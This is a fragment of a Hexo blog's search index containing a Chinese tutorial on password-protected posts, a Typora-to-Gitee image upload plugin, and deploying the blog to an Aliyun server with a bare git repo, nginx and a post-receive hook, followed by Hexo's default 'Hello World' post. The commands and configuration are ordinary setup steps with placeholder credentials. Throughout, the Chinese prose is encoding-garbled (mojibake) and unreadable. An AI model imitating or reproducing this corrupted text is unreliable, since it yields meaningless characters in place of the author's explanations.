bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">title: æ–‡ç« æ ‡é¢˜<br>date: æ—¶é—´ï¼Œå¦‚2020-02-02 02:02:02<br>categories: ç±»åˆ«<br>tags:  æ ‡ç­¾<br>password: 123456<br>abstract: è¿™é‡Œæœ‰ä¸œè¥¿è¢«åŠ å¯†äº†ï¼Œéœ€è¦è¾“å…¥å¯†ç æŸ¥çœ‹å“¦ã€‚<br>message: æ‚¨å¥½ï¼Œè¿™é‡Œéœ€è¦å¯†ç ã€‚<br>wrong_pass_message: æŠ±æ­‰ï¼Œè¿™ä¸ªå¯†ç çœ‹ç€ä¸å¤ªå¯¹ï¼Œè¯·å†è¯•è¯•ã€‚<br>wrong_hash_message: æŠ±æ­‰ï¼Œè¿™ä¸ªæ–‡ç« ä¸èƒ½è¢«çº æ­£ï¼Œä¸è¿‡æ‚¨è¿˜æ˜¯èƒ½çœ‹çœ‹è§£å¯†åçš„å†…å®¹ã€‚<br></code></pre></td></tr></table></figure><p>æ•ˆæœå›¾<br><img src="https://img-blog.csdnimg.cn/202102051217264.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h1 id="Typora-Giteeæ­å»ºå›¾åºŠ"><a href="#Typora-Giteeæ­å»ºå›¾åºŠ" class="headerlink" title="Typora + Giteeæ­å»ºå›¾åºŠ"></a>Typora + Giteeæ­å»ºå›¾åºŠ</h1><p>æŠŠå›¾ç‰‡æ‹–è¿› md ç¼–è¾‘å™¨ï¼Œå›¾ç‰‡ä¼šè‡ªåŠ¨ä¸Šä¼ åˆ°å›¾åºŠï¼Œä¸Šä¼ æˆåŠŸå›¾ç‰‡é¡¶éƒ¨ä¼šå‡ºç°ç»¿è‰²èƒŒæ™¯çš„ç™½å­—è¿›è¡Œæé†’ã€‚è¯¥æ’ä»¶æ”¯æŒã€GitHubã€ä¸ƒç‰›äº‘ã€é˜¿é‡Œäº‘ã€ç äº‘ç­‰ã€‚</p><h2 id="å®‰è£…ç¯å¢ƒ"><a href="#å®‰è£…ç¯å¢ƒ" class="headerlink" title="å®‰è£…ç¯å¢ƒ"></a>å®‰è£…ç¯å¢ƒ</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">Typora ç‰ˆæœ¬ï¼š0.9.68 (Windows x86)<br>ä¸‹è½½åœ°å€ï¼šhttps://typora.io/windows/typora-update-ia32-0320.exe<br>Typoraå®‰è£…ç›®å½•ï¼šD:\Program Files\Typora ï¼Œæˆ–è€…å®‰è£…åœ¨å…¶ä»–ç›®å½•<br></code></pre></td></tr></table></figure><h2 id="å®‰è£…æ­¥éª¤"><a href="#å®‰è£…æ­¥éª¤" class="headerlink" title="å®‰è£…æ­¥éª¤"></a>å®‰è£…æ­¥éª¤</h2><p>è¦†ç›–å®‰è£…çš„æ–¹å¼åœ¨æŸäº›ç‰¹å®šç‰ˆæœ¬ä¸‹ä¼šè§¦å‘bugï¼Œå»ºè®®æŒ‰ç…§è¿™ä¸ª issue ä¸­çš„æ–¹æ³•ä¿®æ”¹ window.html æ–‡ä»¶è€Œä¸æ˜¯ç›´æ¥è¦†ç›–å®ƒï¼Œplugins æ˜¯æ–°å¢ç›®å½•ä¸å­˜åœ¨è¦†ç›–çš„é—®é¢˜ã€‚</p><ol><li>ä¸‹è½½æ’ä»¶ä»£ç </li><li>å¤åˆ¶æ’ä»¶ç›¸å…³ä»£ç æ–‡ä»¶ï¼šwindow.htmlã€pluginsï¼›</li><li>å°†å¤åˆ¶çš„æ’ä»¶ä»£ç æ–‡ä»¶ï¼Œç²˜è´´åˆ°typoraå®‰è£…ç›®å½•ä¸‹çš„ resources\app æ–‡ä»¶å¤¹ä¸‹ï¼›</li><li>å®‰è£…å®Œæˆï¼Œé‡å¯typora</li></ol><h2 id="æ’ä»¶é…ç½®"><a href="#æ’ä»¶é…ç½®" class="headerlink" title="æ’ä»¶é…ç½®"></a>æ’ä»¶é…ç½®</h2><p>æ’ä»¶é»˜è®¤ä¼šå°†å›¾ç‰‡ä¸Šä¼ åˆ°ä¸ªäººç«™ç‚¹ä¸Šï¼ˆè¡—è¾¹ä»·ï¼‰ï¼Œä¸èƒ½ä¿è¯ä¸€ç›´ç»™å¤§å®¶æä¾›æœåŠ¡ï¼Œæ‰€ä»¥æŒ‰ç…§å¥½æ’ä»¶åï¼Œå¼ºçƒˆå»ºè®®ä½ æ¢æˆè‡ªå·±çš„å›¾ç‰‡ä¸Šä¼ æœåŠ¡å™¨ã€‚</p><p>æ›´æ¢å›¾ç‰‡ä¸Šä¼ æ¥å£åœ°å€ï¼Œæ‰“å¼€ plugins/image/upload.js æ–‡ä»¶ï¼Œæ‹‰åˆ°æœ€ä¸‹é¢ å°†æœ€åä¸€è¡Œçš„ $.image.init(); æŒ‰ç…§ä¸‹é¢çš„è¯´æ˜è¿›è¡Œé…ç½®ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">ä¸Šä¼ åˆ°ç äº‘<br><br>// ï¼ï¼ï¼æ³¨æ„å½“å›¾ç‰‡å¤§äº1Mæ—¶ï¼Œ gitee å¿…é¡»ç™»å½•åæ‰èƒ½æŸ¥çœ‹ï¼ï¼ï¼<br>$.image.init(&#123;<br>    target:<span class="hljs-string">&#x27;gitee&#x27;</span>,<br>    gitee: &#123;<br>            message: <span class="hljs-string">&quot;From:https://github.com/Thobian&quot;</span>,     // å¿…é¡»å‚æ•°,æäº¤æ¶ˆæ¯ï¼ˆé»˜è®¤ä¸ºï¼šadd imageï¼‰<br>            branch: <span class="hljs-string">&quot;master&quot;</span>,                               // è¦æäº¤åˆ°çš„åˆ†æ”¯ï¼ˆé»˜è®¤ä¸ºï¼šmasterï¼‰<br>            token: <span class="hljs-string">&#x27;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&#x27;</span>,   // ç äº‘tokenç”³è¯·åœ°å€ https://gitee.com/profile/personal_access_tokens<br>            userName: <span class="hljs-string">&#x27;userName&#x27;</span>,                           // ç”¨æˆ·å æ¯”å¦‚ä½ çš„giteeä¸ªäººä¸»é¡µåœ°å€æ˜¯ï¼šhttps://gitee.com/thobian ï¼Œé‚£userNameå°±æ˜¯ï¼šthobian<br>            repositorie: <span class="hljs-string">&#x27;repositorie&#x27;</span>,                     // ä»“åº“å æ¯”å¦‚ä½ çš„giteeå›¾ç‰‡ä»“åº“åœ°å€æ˜¯ï¼šhttps://gitee.com/thobian/typoraï¼Œé‚£ä¹ˆrepositorieå°±æ˜¯ typora<br>            Folder: <span class="hljs-string">&#x27;image&#x27;</span>,                                // å¯ä»¥æŠŠä¸Šä¼ çš„å›¾ç‰‡éƒ½æ”¾åˆ°è¿™ä¸ªæŒ‡å®šçš„æ–‡ä»¶å¤¹ä¸‹<br>            BucketDomain: <span class="hljs-string">&#x27;https://gitee.com/api/v5/repos/&#x27;</span>,// è¿™ä¸ªæ˜¯ä¸ç”¨å˜çš„ï¼Œç›´æ¥copyå°±å¥½<br>    &#125;<br>&#125;);<br></code></pre></td></tr></table></figure><h1 id="éƒ¨ç½²åˆ°é˜¿é‡Œäº‘æœåŠ¡å™¨"><a href="#éƒ¨ç½²åˆ°é˜¿é‡Œäº‘æœåŠ¡å™¨" class="headerlink" title="éƒ¨ç½²åˆ°é˜¿é‡Œäº‘æœåŠ¡å™¨"></a>éƒ¨ç½²åˆ°é˜¿é‡Œäº‘æœåŠ¡å™¨</h1><h2 id="åˆ›å»ºç§æœ‰-Git-ä»“åº“"><a href="#åˆ›å»ºç§æœ‰-Git-ä»“åº“" class="headerlink" title="åˆ›å»ºç§æœ‰ Git ä»“åº“"></a>åˆ›å»ºç§æœ‰ Git ä»“åº“</h2><p>å®‰è£…Gitï¼ŒGit ç”¨äºç‰ˆæœ¬ç®¡ç†å’Œéƒ¨ç½²</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">apt-get update<br>apt-get install git-core <br></code></pre></td></tr></table></figure><p>åœ¨ /var/repo/ ä¸‹ï¼Œåˆ›å»ºä¸€ä¸ªåä¸º hexo_static çš„è£¸ä»“åº“,ç„¶åéœ€è¦ä¿®æ”¹ç”¨æˆ·å¯¹ç›®å½•çš„æƒé™</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo mkdir /var/repo/<br>sudo chown -R <span class="hljs-variable">$USER</span>:<span class="hljs-variable">$USER</span> /var/repo/<br>sudo chmod -R 755 /var/repo/<br></code></pre></td></tr></table></figure><p>ç„¶å</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /var/repo/<br>git init --bare hexo_static.git<br></code></pre></td></tr></table></figure><h2 id="é…ç½®Nginxæ‰˜ç®¡æ–‡ä»¶ç›®å½•"><a href="#é…ç½®Nginxæ‰˜ç®¡æ–‡ä»¶ç›®å½•" class="headerlink" title="é…ç½®Nginxæ‰˜ç®¡æ–‡ä»¶ç›®å½•"></a>é…ç½®Nginxæ‰˜ç®¡æ–‡ä»¶ç›®å½•</h2><p>å®‰è£…Nginx ï¼Œç”¨äºé™æ€åšå®¢æ‰˜ç®¡ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">apt-get install nginx<br></code></pre></td></tr></table></figure><p>åˆ›å»º /var/www/hexo ç›®å½•</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo mkdir -p /var/www/hexo<br></code></pre></td></tr></table></figure><p>ä¿®æ”¹ç›®å½•çš„æ‰€æœ‰æƒå’Œæƒé™</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo chown -R <span class="hljs-variable">$USER</span>:<span class="hljs-variable">$USER</span> /var/www/hexo<br>sudo chmod -R 755 /var/www/hexo<br></code></pre></td></tr></table></figure><p>ä¿®æ”¹ Nginx çš„ default è®¾ç½®</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo vim /etc/nginx/sites-available/default<br></code></pre></td></tr></table></figure><p>å°†root æŒ‡å‘ <code>/var/www/hexo</code> ç›®å½•ï¼Œä¿®æ”¹å†…å®¹å¦‚ä¸‹ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">server &#123;<br>    listen 80 default_server;<br>    listen [::]:80 default_server;<br><br>    root /var/www/hexo; <span class="hljs-comment"># éœ€è¦ä¿®æ”¹çš„éƒ¨åˆ†</span><br>    index index.html index.htm;<br></code></pre></td></tr></table></figure><p>ç„¶åé‡å¯ Nginx æœåŠ¡</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo service nginx restart<br></code></pre></td></tr></table></figure><h2 id="é…ç½®git-hooks"><a href="#é…ç½®git-hooks" class="headerlink" title="é…ç½®git hooks"></a>é…ç½®git hooks</h2><p>åœ¨hooksæ–‡ä»¶ä¸­åˆ›å»ºpost-receiveæ–‡ä»¶</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vim /var/repo/hexo_static.git/hooks/post-receive<br></code></pre></td></tr></table></figure><p>æ·»åŠ å†…å®¹å¦‚ä¸‹ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br>git --work-tree=/var/www/hexo --git-dir=/var/repo/hexo_static.git checkout -f<br></code></pre></td></tr></table></figure><p>å°†æ­¤æ–‡ä»¶è®¾ç½®æˆå¯æ‰§è¡Œæ–‡ä»¶</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">chmod +x /var/repo/hexo_static.git/hooks/post-receive<br></code></pre></td></tr></table></figure><h2 id="æœ¬åœ°é…ç½®"><a href="#æœ¬åœ°é…ç½®" class="headerlink" title="æœ¬åœ°é…ç½®"></a>æœ¬åœ°é…ç½®</h2><p>ä¿®æ”¹_config.ymlé…ç½®æ–‡ä»¶</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># URL</span><br><span class="hljs-comment">## If your site is put in a subdirectory, set url as &#x27;http://example.com/child&#x27; and root as &#x27;/child/&#x27;</span><br>url: http://æœåŠ¡å™¨IP<br><br>deploy:<br>    <span class="hljs-built_in">type</span>: git<br>    repo: root@æœåŠ¡å™¨IP:/var/repo/hexo_static<br>    branch: master<br></code></pre></td></tr></table></figure><p>å°†æœ¬åœ°å†…å®¹ä¸Šä¼ äº‘æœåŠ¡å™¨</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hexo g -d<br></code></pre></td></tr></table></figure><p>ç¬¬ä¸€æ¬¡ä¼šå‡ºç°ä¸‹å›¾æ‰€ç¤ºé”™è¯¯<br><img src="https://img-blog.csdnimg.cn/20210407175526299.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æ‰§è¡Œå‘½ä»¤</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh-keygen -R æœåŠ¡å™¨IP<br></code></pre></td></tr></table></figure><p>å†æ¬¡æ‰§è¡Œ<code>hexo g -d</code>å³å¯æˆåŠŸ<br><img src="https://img-blog.csdnimg.cn/20210407180432805.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="å¤‡æ¡ˆ"><a href="#å¤‡æ¡ˆ" class="headerlink" title="å¤‡æ¡ˆ"></a>å¤‡æ¡ˆ</h2><p>æ·»åŠ å¤‡æ¡ˆå·<br>åœ¨ä¸»é¢˜æ–‡ä»¶çš„layout_partial\footer.ejsä¸­æ·»åŠ </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs html"> <span class="hljs-comment">&lt;!--æ·»åŠ å¤‡æ¡ˆå·--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;footer-center&quot;</span>&gt;</span><br>         <span class="hljs-comment">&lt;!--img src=&quot;https://static.dy208.cn/o_1dfilp8ruo521thr1hvf18ji17soa.png&quot;--&gt;</span><br>         <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;http://beian.miit.gov.cn/&quot;</span>  <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;color:#f72b07&quot;</span> <span class="hljs-attr">target</span>=<span class="hljs-string">&quot;_blank&quot;</span>&gt;</span>å¤‡æ¡ˆå·<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="ç»‘å®šåŸŸå"><a href="#ç»‘å®šåŸŸå" class="headerlink" title="ç»‘å®šåŸŸå"></a>ç»‘å®šåŸŸå</h2><p>ç™»å½•é˜¿é‡Œäº‘ï¼Œå¹¶è¿›å…¥æ§åˆ¶å°ï¼Œç‚¹å‡»å·¦ä¾§èœå•ä¸­çš„åŸŸåï¼Œè¿›å…¥åŸŸåç®¡ç†ï¼Œé€‰æ‹©è¦è§£æçš„åŸŸåï¼Œç‚¹å‡»è§£æï¼Œè¿›å…¥è§£æè®¾ç½®ã€‚ç‚¹å‡»æ·»åŠ è®°å½•<br><img src="https://img-blog.csdnimg.cn/20210422194119910.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æ·»åŠ è®°å½•ä¸¤æ¡è®°å½•å€¼ï¼Œä¸€ä¸ªæ˜¯wwwï¼Œä¸€ä¸ªæ˜¯@ï¼Œè®°å½•å€¼é˜¿é‡Œäº‘æœåŠ¡å™¨çš„åœ°å€ï¼ˆå…¬ï¼‰</p><p><img src="https://img-blog.csdnimg.cn/20210422194302611.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p><strong>æ³¨æ„ï¼šæœ¬æ–‡æ‰€æœ‰å‘½ä»¤å‡åœ¨git<br>å‘½ä»¤è¡Œä½¿ç”¨</strong></p><p>å‚è€ƒæ–‡ç« ï¼š<br><a href="https://www.imooc.com/article/313424">Hexoç»“åˆStuné™æ€åšå®¢æ­å»ºä»å…¥é—¨åˆ°å…¥åœŸ</a><br><a href="https://www.jianshu.com/p/3a6342e16e57">hexo æ·»åŠ live2dçœ‹æ¿åŠ¨ç”»</a><br><a href="https://blog.csdn.net/qq_43431158/article/details/104221186">è®°å½•æœ¬åœ°Hexoåšå®¢éƒ¨ç½²åˆ°æœåŠ¡å™¨ä¸Š</a></p>]]></content>
    
    
    <categories>
      
      <category>åšå®¢ä¼˜åŒ–</category>
      
    </categories>
    
    
    <tags>
      
      <tag>æ­å»ºåšå®¢</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2020/02/02/hello-world/"/>
    <url>/2020/02/02/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Hello World</p><a id="more"></a><p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
